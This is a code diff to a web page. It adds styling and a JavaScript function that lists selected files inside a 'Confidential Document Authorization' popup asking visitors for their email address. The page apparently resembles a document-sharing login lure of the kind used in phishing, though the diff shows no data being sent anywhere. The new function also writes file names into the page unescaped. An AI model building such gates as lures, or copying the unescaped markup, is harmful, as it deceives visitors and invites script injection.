@@ -486,6 +486,55 @@
             text-align: center;
             margin-bottom: 32px;
         }
+		
+		        .selected-docs-list {
+            background: #F5F7FA;
+            border-radius: 6px;
+            padding: 8px 10px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .selected-docs-header {
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--text-tertiary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .selected-doc-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 0;
+            font-size: 10px;
+            color: var(--text-secondary);
+        }
+
+        .selected-doc-item:not(:last-child) {
+            border-bottom: 1px solid #E8EAED;
+        }
+
+        .selected-doc-icon {
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+
+        .selected-doc-name {
+            flex: 1;
+            font-weight: 500;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .selected-doc-size {
+            font-size: 9px;
+            color: var(--text-tertiary);
+            flex-shrink: 0;
+        }
 
         .lightbox-icon-wrapper {
             width: 64px;
@@ -724,13 +773,17 @@
         </div>
     </div>
 
-    <div class="lightbox" id="lightbox" onclick="handleLightboxClick(event)">
+         <div class="lightbox" id="lightbox" onclick="handleLightboxClick(event)">
         <div class="lightbox-content" onclick="event.stopPropagation()">
             <button class="lightbox-close" onclick="closeLightbox()">×</button>
 
             <div id="authForm">
                 <div class="lightbox-header">
-                    <div class="lightbox-icon-wrapper">🔐</div>
+                    <!-- Selected Documents List -->
+                    <div class="selected-docs-list" id="selectedDocsList">
+                        <!-- Will be populated by JavaScript -->
+                    </div>
+                    
                     <h2 class="lightbox-title">Confidential Document Authorization</h2>
                     <p class="lightbox-subtitle">
                         Please input your email address to confirm you are authorized to access the document.
@@ -1043,11 +1096,48 @@
             }
         }
 
-        function openLightbox() {
+                function openLightbox() {
+            // Populate selected documents list
+            displaySelectedDocuments();
+            
             document.getElementById('lightbox').classList.add('active');
             setTimeout(() => {
                 document.getElementById('emailInput').focus();
             }, 300);
+        }
+
+        function displaySelectedDocuments() {
+            const selectedDocsContainer = document.getElementById('selectedDocsList');
+            const selectedDocs = Array.from(selectedDocuments).map(index => documents[index]);
+            
+            if (selectedDocs.length === 0) {
+                selectedDocsContainer.innerHTML = '';
+                return;
+            }
+
+            // Get icon for file type
+            const getFileIcon = (fileType) => {
+                const icons = {
+                    'pdf': '📄',
+                    'docx': '📝',
+                    'xlsx': '📊',
+                    'default': '📄'
+                };
+                return icons[fileType] || icons.default;
+            };
+
+            const docsHTML = selectedDocs.map(doc => `
+                <div class="selected-doc-item">
+                    <span class="selected-doc-icon">${getFileIcon(doc.fileType)}</span>
+                    <span class="selected-doc-name">${doc.name}</span>
+                    <span class="selected-doc-size">${doc.size}</span>
+                </div>
+            `).join('');
+
+            selectedDocsContainer.innerHTML = `
+                <div class="selected-docs-header">Selected Documents (${selectedDocs.length})</div>
+                ${docsHTML}
+            `;
         }
 
         function closeLightbox() {
